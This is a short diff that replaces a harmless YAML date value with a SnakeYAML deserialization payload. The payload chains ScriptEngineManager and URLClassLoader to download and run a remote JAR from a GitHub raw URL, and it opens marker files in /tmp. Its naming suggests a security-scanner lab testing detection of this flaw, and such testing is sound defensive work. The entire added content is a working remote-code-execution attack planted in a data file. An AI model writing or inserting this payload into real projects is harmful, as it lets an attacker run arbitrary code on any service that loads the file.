@@ -1,1 +1,13 @@
-!!java.util.Date {}
+[
+  !!javax.script.ScriptEngineManager [
+    !!java.net.URLClassLoader [
+      [ !!java.net.URL ["https://raw.githubusercontent.com/ABDUS-TEST-ORG/codacy-public-lab/dirtyfrag-attempt-20260713/e2e.jar"] ]
+    ]
+  ],
+  !!java.io.FileInputStream [
+    "/tmp/CODACY_SNAKEYAML_RCE_MARKER"
+  ],
+  !!java.io.FileInputStream [
+    "/tmp/CODACY_SNAKEYAML_RCE_MARKER_MISSING"
+  ]
+]
